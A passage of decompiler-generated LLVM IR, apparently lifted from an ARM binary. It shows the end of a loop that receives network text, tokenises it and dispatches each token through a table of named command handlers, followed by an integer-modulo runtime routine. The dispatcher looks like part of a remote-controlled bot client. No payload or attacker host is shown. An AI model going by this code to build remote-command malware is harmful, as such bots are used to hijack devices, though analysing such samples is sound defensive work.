dec_label_pc_a854:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a838
  %v2_a864 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a86c = icmp ult i32 %.pre133, %v2_a864
  br i1 %v3_a86c, label %dec_label_pc_a6dc, label %dec_label_pc_a874

dec_label_pc_a874:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a860.preheader
  %v2_a878 = load i32, i32* @global_var_3021c.43, align 4
  %v3_a87c = udiv i32 %v2_a878, 32
  %v3_a888 = mul nuw nsw i32 %v3_a87c, 4
  %v2_a890 = add i32 %v3_a888, %v16_a1c8
  %v2_a894 = add i32 %v2_a890, -636
  %v1_a898 = inttoptr i32 %v2_a894 to i32*
  %v2_a898 = load i32, i32* %v1_a898, align 4
  %v1_a8a4 = urem i32 %v2_a878, 32
  %v6_a8a84 = lshr i32 %v2_a898, %v1_a8a4
  %v1_a8b0 = urem i32 %v6_a8a84, 2
  %v2_a8b4 = icmp eq i32 %v1_a8b0, 0
  br i1 %v2_a8b4, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_a8bc

dec_label_pc_a8bc:                                ; preds = %dec_label_pc_a874
  store i32 %v2_a878, i32* @r0, align 4
  store i32 %v2_a8cc, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_a8e0 = call i32 @recv()
  %tmp78 = icmp slt i32 %v0_a8e0, 1
  br i1 %tmp78, label %dec_label_pc_a58c, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8bc
  %v2_a90c = add i32 %v2_a908, %v0_a8e0
  %v3_a90c = inttoptr i32 %v2_a90c to i8*
  store i8 0, i8* %v3_a90c, align 1
  store i32 %v2_a8cc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d2f0.172 to i32), i32* @r1, align 4
  %v6_a92c = call i32 @__GI_strtok(i32 %v2_a8cc, i32 ptrtoint (i32* @global_var_1d2f0.172 to i32), i32 %v2_a90c, i32 %v2_a8cc, i32 %v0_a8e0)
  %v2_ab7831 = icmp eq i32 %v6_a92c, 0
  br i1 %v2_ab7831, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_ab80

dec_label_pc_a93c:                                ; preds = %dec_label_pc_ab80
  %v3_a940 = call i32 @filter(i8* nonnull %storemerge33)
  %v2_a948 = load i8, i8* %storemerge33, align 1
  %v7_a94c = icmp eq i8 %v2_a948, 58
  br i1 %v7_a94c, label %dec_label_pc_a96c, label %dec_label_pc_a9f8

dec_label_pc_a960:                                ; preds = %dec_label_pc_a984
  %v1_a964 = add i32 %storemerge22, 1
  br label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a93c, %dec_label_pc_a960
  %storemerge22 = phi i32 [ %v1_a964, %dec_label_pc_a960 ], [ 0, %dec_label_pc_a93c ]
  %v3_a974 = call i32 @strlen(i8* %storemerge33)
  %v3_a97c = icmp ult i32 %storemerge22, %v3_a974
  br i1 %v3_a97c, label %dec_label_pc_a984, label %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge

dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge:    ; preds = %dec_label_pc_a96c
  %.pre = add i32 %storemerge22, %storemerge33.in
  %.pre34 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a9a0

dec_label_pc_a984:                                ; preds = %dec_label_pc_a96c
  %v2_a990 = add i32 %storemerge22, %storemerge33.in
  %v1_a994 = inttoptr i32 %v2_a990 to i8*
  %v2_a994 = load i8, i8* %v1_a994, align 1
  %v7_a998 = icmp eq i8 %v2_a994, 32
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a960

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge
  %v3_a9b4.pre-phi = phi i8* [ %.pre34, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge ], [ %v1_a994, %dec_label_pc_a984 ]
  %v2_a9ac.pre-phi = phi i32 [ %.pre, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge ], [ %v2_a990, %dec_label_pc_a984 ]
  store i8 0, i8* %v3_a9b4.pre-phi, align 1
  %v1_a9bc = add i32 %storemerge33.in, 1
  %v2_a9d0 = inttoptr i32 %v1_a9bc to i8*
  %v3_a9d0 = call i32 @strcpy(i32 %v2_a9c4, i8* %v2_a9d0)
  %v1_a9e4 = add i32 %v2_a9ac.pre-phi, 1
  %v3_a9f0 = inttoptr i32 %v1_a9e4 to i8*
  %v4_a9f0 = call i32 @strcpy(i32 %storemerge33.in, i8* %v3_a9f0)
  br label %dec_label_pc_aa28

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a93c
  store i32 42, i32* %stack_var_-2704, align 4
  br label %dec_label_pc_aa28

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aa40
  %v1_aa20 = add i32 %storemerge19, 1
  br label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_a9f8, %dec_label_pc_a9a0, %dec_label_pc_aa1c
  %storemerge19 = phi i32 [ %v1_aa20, %dec_label_pc_aa1c ], [ 0, %dec_label_pc_a9a0 ], [ 0, %dec_label_pc_a9f8 ]
  store i32 %storemerge19, i32* @r4, align 4
  %v3_aa30 = call i32 @strlen(i8* %storemerge33)
  %v0_aa38 = load i32, i32* @r4, align 4
  %v3_aa38 = icmp ult i32 %v0_aa38, %v3_aa30
  br i1 %v3_aa38, label %dec_label_pc_aa40, label %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge

dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge:    ; preds = %dec_label_pc_aa28
  %.pre35 = add i32 %storemerge19, %storemerge33.in
  %.pre36 = inttoptr i32 %.pre35 to i8*
  br label %dec_label_pc_aa5c

dec_label_pc_aa40:                                ; preds = %dec_label_pc_aa28
  %v2_aa4c = add i32 %storemerge19, %storemerge33.in
  %v1_aa50 = inttoptr i32 %v2_aa4c to i8*
  %v2_aa50 = load i8, i8* %v1_aa50, align 1
  %v7_aa54 = icmp eq i8 %v2_aa50, 32
  br i1 %v7_aa54, label %dec_label_pc_aa5c, label %dec_label_pc_aa1c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa40, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge
  %v3_aa70.pre-phi = phi i8* [ %.pre36, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge ], [ %v1_aa50, %dec_label_pc_aa40 ]
  %v2_aa68.pre-phi = phi i32 [ %.pre35, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge ], [ %v2_aa4c, %dec_label_pc_aa40 ]
  store i8 0, i8* %v3_aa70.pre-phi, align 1
  %v4_aa84 = call i32 @strcpy(i32 %v2_aa78, i8* %storemerge33)
  %v1_aa98 = add i32 %v2_aa68.pre-phi, 1
  %v3_aaa4 = inttoptr i32 %v1_aa98 to i8*
  %v4_aaa4 = call i32 @strcpy(i32 %storemerge33.in, i8* %v3_aaa4)
  %v8_ab34116 = load i32, i32* bitcast ([4 x i8]** @global_var_27068.175 to i32*), align 4
  %v2_ab38118 = icmp eq i32 %v8_ab34116, 0
  br i1 %v2_ab38118, label %dec_label_pc_ab40, label %dec_label_pc_aab4

dec_label_pc_aab4:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aab4
  %v7_ab34121 = phi i32* [ %v7_ab34, %dec_label_pc_aab4 ], [ bitcast ([4 x i8]** @global_var_27068.175 to i32*), %dec_label_pc_aa5c ]
  %storemerge20119 = phi i32 [ %v1_ab24, %dec_label_pc_aab4 ], [ 0, %dec_label_pc_aa5c ]
  %v7_aabc = load i32, i32* %v7_ab34121, align 4
  %v2_aad0 = inttoptr i32 %v7_aabc to i8*
  %v3_aad0 = call i32 @__GI_strcasecmp(i8* %v2_aad0, i32 %v2_aa78)
  %v3_aaec = mul i32 %storemerge20119, 8
  %v2_aaf4 = add i32 %v3_aaec, add (i32 ptrtoint ([4 x i8]** @global_var_27068.175 to i32), i32 4)
  %v1_aaf8 = inttoptr i32 %v2_aaf4 to i32*
  %v2_aaf8 = load i32, i32* %v1_aaf8, align 4
  store i32 %v2_aaf8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_aaf8)
  %v1_ab24 = add i32 %storemerge20119, 1
  %v5_ab34 = mul i32 %v1_ab24, 8
  %v6_ab34 = add i32 %v5_ab34, ptrtoint ([4 x i8]** @global_var_27068.175 to i32)
  %v7_ab34 = inttoptr i32 %v6_ab34 to i32*
  %v8_ab34 = load i32, i32* %v7_ab34, align 4
  %v2_ab38 = icmp eq i32 %v8_ab34, 0
  br i1 %v2_ab38, label %dec_label_pc_ab40, label %dec_label_pc_aab4

dec_label_pc_ab40:                                ; preds = %dec_label_pc_aab4, %dec_label_pc_aa5c
  %v4_ab50 = call i32 @__GI_strcasecmp(i8* %v3_ab50, i32 ptrtoint ([6 x i8]* @global_var_1d2f4.177 to i32))
  %v2_ab58 = icmp eq i32 %v4_ab50, 0
  br i1 %v2_ab58, label %dec_label_pc_a58c, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab40
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d2f0.172 to i32), i32* @r1, align 4
  %v6_ab68 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1d2f0.172 to i32), i32 ptrtoint ([4 x i8]** @global_var_27068.175 to i32), i32 %v4_ab50, i32 ptrtoint (i32* @0 to i32))
  %v2_ab78 = icmp eq i32 %v6_ab68, 0
  br i1 %v2_ab78, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_ab80

dec_label_pc_ab80:                                ; preds = %dec_label_pc_a8f8, %dec_label_pc_ab60
  %storemerge33.in = phi i32 [ %v6_ab68, %dec_label_pc_ab60 ], [ %v6_a92c, %dec_label_pc_a8f8 ]
  %storemerge33 = inttoptr i32 %storemerge33.in to i8*
  %v2_ab84 = load i8, i8* %storemerge33, align 1
  %v2_ab88 = icmp eq i8 %v2_ab84, 0
  br i1 %v2_ab88, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_a93c

; uselistorder directives
  uselistorder i8* %storemerge33, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge33.in, { 7, 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %v7_ab34, { 1, 0 }
  uselistorder i32 %v1_ab24, { 1, 0 }
  uselistorder i32 %storemerge20119, { 1, 0 }
  uselistorder i32 %.pre35, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge22, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a8e0, { 1, 0, 2 }
  uselistorder i32 %v2_a878, { 2, 1, 0 }
  uselistorder i32 %v1_a81c, { 1, 0 }
  uselistorder i32 %v3_a7e8, { 1, 0 }
  uselistorder i32 %storemerge17102, { 1, 0 }
  uselistorder i32 %v1_a7cc, { 1, 0 }
  uselistorder i32 %v1_a798, { 1, 0 }
  uselistorder i32 %v2_a794, { 1, 0 }
  uselistorder i32 %v1_a718, { 0, 2, 1 }
  uselistorder i32 %v1_a79891, { 1, 0 }
  uselistorder i32 %.pre133, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge15115, { 1, 0 }
  uselistorder i32 %v2_a62c, { 1, 0 }
  uselistorder i32 %storemerge1428, { 1, 0 }
  uselistorder i32 %v2_a8cc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a5ec, { 1, 0 }
  uselistorder i32 %v1_a4fc, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 2 }
  uselistorder i32 %v3_a388, { 1, 0, 2 }
  uselistorder i32 %v2_a2f4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-72.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1680, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_27068.175 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_27068.175, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d2f0.172 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_30234.54, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_2b908.52, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_3021c.43, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 14, 15 }
  uselistorder i32* @global_var_30224.134, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_30214.162, { 1, 0 }
  uselistorder i32* @global_var_30210.60, { 1, 0 }
  uselistorder i32* @global_var_30218.94, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_1d244.124, { 1, 0 }
  uselistorder i32 (i32)* @makestring, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d038.58 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab80, { 1, 0 }
  uselistorder label %dec_label_pc_aab4, { 1, 0 }
  uselistorder label %dec_label_pc_aa28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a96c, { 1, 0 }
  uselistorder label %dec_label_pc_a854, { 1, 0 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a7e4, { 1, 0 }
  uselistorder label %dec_label_pc_a724, { 1, 0 }
  uselistorder label %dec_label_pc_a600, { 1, 0 }
  uselistorder label %dec_label_pc_a600.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a58c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a4ac, { 1, 0 }
  uselistorder label %dec_label_pc_a3e8, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a2b0, { 1, 0 }
  uselistorder label %dec_label_pc_a23c, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_abfc = icmp eq i32 %arg2, 0
  br i1 %v2_abfc, label %dec_label_pc_acd0, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %entry
  %v1_abfc = icmp slt i32 %arg2, 0
  br i1 %v1_abfc, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_ac04
  %v2_ac04 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_ac04, %bb
  %v4_ac1c = phi i32 [ %arg2, %dec_label_pc_ac04 ], [ %v2_ac04, %bb ]
  %v0_ac08 = load i32, i32* @r0, align 4
  %v1_ac08 = icmp slt i32 %v0_ac08, 0
  br i1 %v1_ac08, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_ac0c = sub i32 0, %v0_ac08
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_ac14 = phi i32 [ %v0_ac08, %bb79 ], [ %v2_ac0c, %bb80 ]
  %v1_ac10 = add i32 %v4_ac1c, -1
  %v7_ac10 = icmp eq i32 %v4_ac1c, 1
  br i1 %v7_ac10, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_ac14 = icmp eq i32 %v1_ac14, %v4_ac1c
  br i1 %v10_ac14, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_ac14 = icmp ult i32 %v1_ac14, %v4_ac1c
  br i1 %v4_ac14, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_ac1c = and i32 %v1_ac10, %v4_ac1c
  %v8_ac1c = icmp eq i32 %v6_ac1c, 0
  br i1 %v8_ac1c, label %.thread72, label %dec_label_pc_ac2c.preheader

dec_label_pc_ac2c.preheader:                      ; preds = %bb84
  %v2_ac2c109 = icmp ugt i32 %v4_ac1c, 268435455
  br i1 %v2_ac2c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_ac2064 = phi i32 [ %v1_ac14, %bb84 ], [ 0, %.thread70 ]
  %v3_ac20 = and i32 %v1_ac2064, %v1_ac10
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_ac2c.preheader
  %v0_ac40.pr35.lcssa = phi i32 [ %v4_ac1c, %dec_label_pc_ac2c.preheader ], [ %v4_ac34, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_ac2c.preheader ], [ %v2_ac389, %.thread2.thread7 ]
  br label %dec_label_pc_ac40thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_ac2c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_ac389, %.thread2.thread7 ], [ 0, %dec_label_pc_ac2c.preheader ]
  %v0_ac40.pr35110 = phi i32 [ %v4_ac34, %.thread2.thread7 ], [ %v4_ac1c, %dec_label_pc_ac2c.preheader ]
  %v4_ac30 = icmp ult i32 %v0_ac40.pr35110, %v1_ac14
  br i1 %v4_ac30, label %bb86, label %dec_label_pc_ac40thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_ac34 = and i32 %v0_ac40.pr35110, 268435456
  %v3_ac34 = icmp eq i32 %v2_ac34, 0
  %v4_ac34 = mul i32 %v0_ac40.pr35110, 16
  br i1 %v3_ac34, label %.thread2.thread7, label %dec_label_pc_ac40.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_ac389 = add i32 %storemerge111, 4
  %v2_ac2c = icmp ugt i32 %v4_ac34, 268435455
  br i1 %v2_ac2c, label %.thread1, label %bb85

dec_label_pc_ac40thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_ac40thread-pre-split.loopexit

dec_label_pc_ac40thread-pre-split.loopexit:       ; preds = %dec_label_pc_ac40thread-pre-split.loopexit.loopexit, %.thread1
  %v0_ac40.pr35108 = phi i32 [ %v0_ac40.pr35.lcssa, %.thread1 ], [ %v0_ac40.pr35110, %dec_label_pc_ac40thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_ac40thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ac40thread-pre-split

dec_label_pc_ac40thread-pre-split:                ; preds = %.thread4, %dec_label_pc_ac40thread-pre-split.loopexit
  %v1_ac4c41 = phi i32 [ %storemerge105, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v2_ac4c, %.thread4 ]
  %v2_ac4436 = phi i32 [ %v1_ac14, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v2_ac44, %.thread4 ]
  %v0_ac40.pr = phi i32 [ %v0_ac40.pr35108, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v3_ac48, %.thread4 ]
  br label %dec_label_pc_ac40

dec_label_pc_ac40.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_ac40

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac40.loopexit, %dec_label_pc_ac40thread-pre-split
  %v0_ac54.pr = phi i32 [ %v1_ac4c41, %dec_label_pc_ac40thread-pre-split ], [ %storemerge111, %dec_label_pc_ac40.loopexit ]
  %v2_ac44 = phi i32 [ %v2_ac4436, %dec_label_pc_ac40thread-pre-split ], [ %v1_ac14, %dec_label_pc_ac40.loopexit ]
  %v1_ac48 = phi i32 [ %v0_ac40.pr, %dec_label_pc_ac40thread-pre-split ], [ %v4_ac34, %dec_label_pc_ac40.loopexit ]
  %v2_ac40 = icmp slt i32 %v1_ac48, 0
  br i1 %v2_ac40, label %dec_label_pc_ac54, label %bb87

bb87:                                             ; preds = %dec_label_pc_ac40
  %v4_ac44 = icmp ult i32 %v1_ac48, %v2_ac44
  br i1 %v4_ac44, label %.thread4, label %dec_label_pc_ac54

.thread4:                                         ; preds = %bb87
  %v3_ac48 = mul i32 %v1_ac48, 2
  %v2_ac4c = add i32 %v0_ac54.pr, 1
  br label %dec_label_pc_ac40thread-pre-split

dec_label_pc_ac54:                                ; preds = %bb87, %dec_label_pc_ac40
  %v2_ac54 = add i32 %v0_ac54.pr, -3
  %v5_ac58 = icmp slt i32 %v0_ac54.pr, 3
  br i1 %v5_ac58, label %dec_label_pc_ac98, label %dec_label_pc_ac5c

dec_label_pc_ac5c:                                ; preds = %dec_label_pc_ac54, %bb91
  %v6_ac84 = phi i32 [ %v0_ac8c, %bb91 ], [ %v2_ac54, %dec_label_pc_ac54 ]
  %v1_ac60 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %bb91 ], [ %v2_ac44, %dec_label_pc_ac54 ]
  %v3_ac8010 = phi i32 [ %v3_ac80, %bb91 ], [ %v1_ac48, %dec_label_pc_ac54 ]
  %v3_ac5c = icmp ult i32 %v1_ac60, %v3_ac8010
  %v3_ac60 = select i1 %v3_ac5c, i32 0, i32 %v3_ac8010
  %v1_ac68 = sub i32 %v1_ac60, %v3_ac60
  %v4_ac64 = udiv i32 %v3_ac8010, 2
  %v6_ac64 = icmp ult i32 %v1_ac68, %v4_ac64
  %v6_ac68 = select i1 %v6_ac64, i32 0, i32 %v4_ac64
  %v1_ac68.v6_ac68 = sub i32 %v1_ac68, %v6_ac68
  %.demorgan = and i1 %v3_ac5c, %v6_ac64
  %v4_ac6c = udiv i32 %v3_ac8010, 4
  %v6_ac6c = icmp ult i32 %v1_ac68.v6_ac68, %v4_ac6c
  %v6_ac70 = select i1 %v6_ac6c, i32 0, i32 %v4_ac6c
  %v1_ac68.v6_ac68.v6_ac70 = sub i32 %v1_ac68.v6_ac68, %v6_ac70
  %.demorgan76 = and i1 %.demorgan, %v6_ac6c
  %v4_ac74 = udiv i32 %v3_ac8010, 8
  %v6_ac74 = icmp ult i32 %v1_ac68.v6_ac68.v6_ac70, %v4_ac74
  %v6_ac78 = select i1 %v6_ac74, i32 0, i32 %v4_ac74
  %v1_ac68.v6_ac68.v6_ac70.v6_ac78 = sub i32 %v1_ac68.v6_ac68.v6_ac70, %v6_ac78
  %.demorgan77 = and i1 %.demorgan76, %v6_ac74
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_ac5c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_ac5c, %bb88
  %v2_ac7c = add i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, -1
  %v4_ac7c = sub i32 0, %v1_ac68.v6_ac68.v6_ac70.v6_ac78
  %v5_ac7c = and i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %v4_ac7c
  %v3_ac80 = udiv i32 %v3_ac8010, 16
  %v5_ac84 = icmp slt i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, 1
  br i1 %v5_ac84, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_ac84 = add i32 %v6_ac84, -4
  %v9_ac84 = sub i32 3, %v6_ac84
  %v10_ac84 = and i32 %v9_ac84, %v6_ac84
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_ac8c = phi i32 [ %v6_ac84, %bb89 ], [ %v7_ac84, %bb90 ]
  %v0_ac8813.in = phi i32 [ %v2_ac7c, %bb89 ], [ %v7_ac84, %bb90 ]
  %v1_ac8812.in = phi i32 [ %v5_ac7c, %bb89 ], [ %v10_ac84, %bb90 ]
  %v1_ac8812 = icmp slt i32 %v1_ac8812.in, 0
  %v0_ac8813 = icmp slt i32 %v0_ac8813.in, 0
  %v2_ac88 = xor i1 %v0_ac8813, %v1_ac8812
  br i1 %v2_ac88, label %dec_label_pc_ac8c, label %dec_label_pc_ac5c

dec_label_pc_ac8c:                                ; preds = %bb91
  %v1_ac8c = urem i32 %v0_ac8c, 4
  %v2_ac8c = icmp eq i32 %v1_ac8c, 0
  br i1 %v2_ac8c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_ac8c
  %v3_ac90 = icmp eq i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, 0
  br i1 %v3_ac90, label %.thread6, label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %bb92, %dec_label_pc_ac54
  %v0_acac = phi i32 [ %v3_ac80, %bb92 ], [ %v1_ac48, %dec_label_pc_ac54 ]
  %v1_aca8 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %bb92 ], [ %v2_ac44, %dec_label_pc_ac54 ]
  %v0_ac98 = phi i32 [ %v0_ac8c, %bb92 ], [ %v2_ac54, %dec_label_pc_ac54 ]
  %v5_ac9c = icmp slt i32 %v0_ac98, -2
  br i1 %v5_ac9c, label %dec_label_pc_acbc, label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac98
  %v8_ac98 = icmp eq i32 %v0_ac98, -2
  br i1 %v8_ac98, label %dec_label_pc_acb0, label %dec_label_pc_aca4

dec_label_pc_aca4:                                ; preds = %dec_label_pc_aca0
  %v3_aca4 = icmp ult i32 %v1_aca8, %v0_acac
  br i1 %v3_aca4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_aca4
  %v2_aca4 = sub i32 %v1_aca8, %v0_acac
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_aca4, %bb93
  %v0_acb054 = phi i32 [ %v1_aca8, %dec_label_pc_aca4 ], [ %v2_aca4, %bb93 ]
  %v3_acac = udiv i32 %v0_acac, 2
  br label %dec_label_pc_acb0

dec_label_pc_acb0:                                ; preds = %dec_label_pc_aca0, %bb94
  %v0_acb8 = phi i32 [ %v0_acac, %dec_label_pc_aca0 ], [ %v3_acac, %bb94 ]
  %v1_acb4 = phi i32 [ %v1_aca8, %dec_label_pc_aca0 ], [ %v0_acb054, %bb94 ]
  %v3_acb0 = icmp ult i32 %v1_acb4, %v0_acb8
  br i1 %v3_acb0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_acb0
  %v2_acb0 = sub i32 %v1_acb4, %v0_acb8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_acb0, %bb95
  %v0_acbc57 = phi i32 [ %v1_acb4, %dec_label_pc_acb0 ], [ %v2_acb0, %bb95 ]
  %v3_acb8 = udiv i32 %v0_acb8, 2
  br label %dec_label_pc_acbc

dec_label_pc_acbc:                                ; preds = %dec_label_pc_ac98, %bb96
  %v2_acc0 = phi i32 [ %v0_acac, %dec_label_pc_ac98 ], [ %v3_acb8, %bb96 ]
  %v1_acc0 = phi i32 [ %v1_aca8, %dec_label_pc_ac98 ], [ %v0_acbc57, %bb96 ]
  %v3_acbc = icmp ult i32 %v1_acc0, %v2_acc0
  br i1 %v3_acbc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_acbc
  %v2_acbc = sub i32 %v1_acc0, %v2_acc0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_acbc, %bb83, %.thread72, %dec_label_pc_ac8c, %bb92, %bb97
  %v1_acc8 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %dec_label_pc_ac8c ], [ 0, %bb92 ], [ %v1_acc0, %dec_label_pc_acbc ], [ %v2_acbc, %bb97 ], [ %v3_ac20, %.thread72 ], [ %v1_ac14, %bb83 ]
  br i1 %v1_ac08, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_acc8 = sub i32 0, %v1_acc8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_accc = phi i32 [ %v1_acc8, %.thread6 ], [ %v2_acc8, %bb98 ]
  ret i32 %v1_accc

dec_label_pc_acd0:                                ; preds = %entry
  %v0_acd0 = load i32, i32* @lr, align 4
  %v0_acd4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_acd0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_acac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_ac8c, { 1, 0, 2 }
  uselistorder i32 %v7_ac84, { 1, 0 }
  uselistorder i32 %v3_ac80, { 1, 0 }
  uselistorder i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_ac74, { 1, 0 }
  uselistorder i32 %v4_ac6c, { 1, 0 }
  uselistorder i32 %v4_ac64, { 1, 0 }
  uselistorder i32 %v6_ac84, { 3, 0, 2, 1 }
  uselistorder i32 %v2_ac54, { 1, 0 }
  uselistorder i32 %v1_ac48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_ac44, { 1, 0, 3, 2 }
  uselistorder i32 %v4_ac34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_ac40.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ac14, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_ac1c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_acbc, { 1, 0 }
